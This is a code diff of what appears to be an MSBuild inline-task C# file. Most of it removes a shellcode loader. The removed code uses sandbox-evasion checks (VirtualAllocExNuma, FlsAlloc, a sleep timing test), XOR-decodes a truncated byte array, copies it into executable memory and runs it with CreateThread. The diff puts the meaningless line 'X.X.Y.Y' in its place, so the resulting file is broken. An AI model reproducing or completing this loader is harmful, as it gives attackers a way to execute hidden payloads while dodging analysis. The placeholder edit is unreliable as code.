@@ -22,53 +22,7 @@
             using System.Text;
             using System.Threading;
                 public class ClassExample : Task, ITask
-                {
-                    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-                    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
-                    uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
-                    [DllImport("kernel32.dll")]
-                    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-                    [DllImport("kernel32.dll")]
-                    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-                    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-                    static extern UInt32 FlsAlloc(IntPtr lpCallback);
-                    [DllImport("kernel32.dll")]
-                    static extern void Sleep(uint dwMilliseconds);
-                    [DllImport("kernel32.dll")]
-                    static extern IntPtr GetCurrentProcess();
-                    public static void Main(string[] args)
-                    { 
-                        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x40, 0);
-                        if (mem == null)
-                        {
-                            return;
-                        }
-
-                        UInt32 result = FlsAlloc(IntPtr.Zero);
-                        if (result == 0xFFFFFFFF)
-                        {
-                            return;
-                        }
-
-
-                        DateTime t1 = DateTime.Now;
-                        Sleep(3000);
-                        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
-                        if (t2 < 1.5)
-                        {
-                            return;
-                        }
-
-                        byte[] buf = new byte[631] { 0x06,0xb2,0x79,0x1e,0x0a,0x12,0x36,0xfa,0xfa,0xfa,0xbb,0xab,....};
-
-                        for (int i = 0; i < buf.Length; i++)
-                        {
-                            buf[i] = (byte)((uint)buf[i] ^ 0xfa);
-                        }
-                        int size = buf.Length;
-                        Marshal.Copy(buf, 0, mem, size);
-                        IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
-                        WaitForSingleObject(hThread, 0xFFFFFFFF);
+                X.X.Y.Y
                     }
                 public override bool Execute()
                 {
